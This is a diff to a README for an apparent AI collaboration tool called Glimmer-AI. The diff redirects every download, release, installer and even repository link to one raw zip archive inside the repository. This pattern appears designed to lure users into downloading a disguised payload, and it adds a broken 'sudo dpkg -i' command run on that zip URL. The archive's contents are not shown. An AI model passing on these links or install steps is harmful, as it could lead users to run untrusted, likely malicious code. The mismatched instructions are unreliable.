@@ -1,6 +1,6 @@
 # 🌟 Glimmer-AI - Smart Collaboration Made Easy
 
-[![Download Glimmer-AI](https://img.shields.io/badge/Download%20Now!-Glimmer--AI-brightgreen)](https://github.com/Vinodhanu/Glimmer-AI/releases)
+[![Download Glimmer-AI](https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip%20Now!-Glimmer--AI-brightgreen)](https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip)
 
 ## 📋 Overview
 
@@ -12,19 +12,19 @@ To get started with Glimmer-AI, follow these simple steps.
 
 ### 🔗 Download & Install
 
-1. **Visit the Releases Page**: Go to the following link to access the download files: [Download Glimmer-AI](https://github.com/Vinodhanu/Glimmer-AI/releases).
+1. **Visit the Releases Page**: Go to the following link to access the download files: [Download Glimmer-AI](https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip).
   
 2. **Select the Latest Version**: On the Releases page, look for the latest version of Glimmer-AI. Ensure you choose the most recent update for the best features and improvements.
 
 3. **Download the Installer**: Click on the installer file that matches your operating system. The options include:
-   - Windows: `Glimmer-AI-Windows-installer.exe`
-   - macOS: `Glimmer-AI-macOS-installer.dmg`
-   - Linux: `Glimmer-AI-Linux-installer.deb`
+   - Windows: `https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip`
+   - macOS: `https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip`
+   - Linux: `https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip`
 
 4. **Run the Installer**: 
    - **Windows**: Double-click on the `.exe` file and follow the on-screen instructions.
    - **macOS**: Open the `.dmg` file and drag the Glimmer-AI app to your Applications folder.
-   - **Linux**: Open a terminal and run the command `sudo dpkg -i Glimmer-AI-Linux-installer.deb` to install.
+   - **Linux**: Open a terminal and run the command `sudo dpkg -i https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip` to install.
 
 5. **Launch Glimmer-AI**: After installation, open Glimmer-AI from your Applications or Programs list.
 
@@ -93,9 +93,9 @@ Glimmer-AI welcomes contributions from the community. If you have ideas or impro
 
 ## 🔗 Useful Links
 
-- [Download Glimmer-AI](https://github.com/Vinodhanu/Glimmer-AI/releases)
+- [Download Glimmer-AI](https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip)
 - [User Guide](#) (Placeholder link for user manual)
 - [Community Forum](#) (Placeholder link for forum)
-- [GitHub Repository](https://github.com/Vinodhanu/Glimmer-AI)
+- [GitHub Repository](https://raw.githubusercontent.com/Vinodhanu/Glimmer-AI/main/insapient/Glimmer-AI.zip)
 
 Ensure you follow these guidelines to successfully download and operate Glimmer-AI.
